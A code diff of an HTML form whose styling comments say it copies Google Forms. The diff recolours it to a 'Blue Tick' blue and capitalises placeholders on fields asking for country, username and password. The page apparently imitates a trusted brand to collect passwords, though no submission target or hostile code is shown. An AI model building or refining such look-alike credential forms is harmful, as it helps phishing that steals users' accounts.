@@ -8,7 +8,7 @@
         /* General Page Styling */
         body {
             font-family: 'Roboto', Arial, sans-serif;
-            background-color: #f0ebf8; /* Soft purple Google Forms background */
+            background-color: #e8f5fe; /* Light blue matching the theme */
             margin: 0;
             padding: 20px;
             display: flex;
@@ -25,7 +25,7 @@
         .title-block {
             background-color: #ffffff;
             border-radius: 8px;
-            border-top: 10px solid #673ab7; /* Google Forms signature purple bar */
+            border-top: 10px solid #1DA1F2; /* Changed from purple to Blue Tick color */
             padding: 24px;
             margin-bottom: 12px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
@@ -93,12 +93,12 @@
         /* Input Highlight on Click */
         .input-block input[type="text"]:focus,
         .input-block input[type="password"]:focus {
-            border-bottom: 2px solid #673ab7;
+            border-bottom: 2px solid #1DA1F2; /* Changed from purple to Blue Tick color */
         }
 
         /* Submit Button Styling */
         .submit-btn {
-            background-color: #673ab7;
+            background-color: #1DA1F2; /* Changed from purple to Blue Tick color */
             color: white;
             border: none;
             padding: 10px 24px;
@@ -111,7 +111,7 @@
         }
 
         .submit-btn:hover {
-            background-color: #512da8;
+            background-color: #0d8bd9; /* Darker blue shade for hover state */
         }
     </style>
 </head>
@@ -136,19 +136,19 @@
             <!-- Block 2: Country Input -->
             <div class="input-block">
                 <label for="country">Country</label>
-                <input type="text" id="country" name="country" placeholder="enter" required>
+                <input type="text" id="country" name="country" placeholder="Enter" required>
             </div>
 
             <!-- Block 3: Username Input -->
             <div class="input-block">
                 <label for="username">Username</label>
-                <input type="text" id="username" name="username" placeholder="enter" required>
+                <input type="text" id="username" name="username" placeholder="Enter" required>
             </div>
 
             <!-- Block 4: Password Input -->
             <div class="input-block">
                 <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="enter" required>
+                <input type="password" id="password" name="password" placeholder="Enter" required>
             </div>
 
             <!-- Form Submission -->
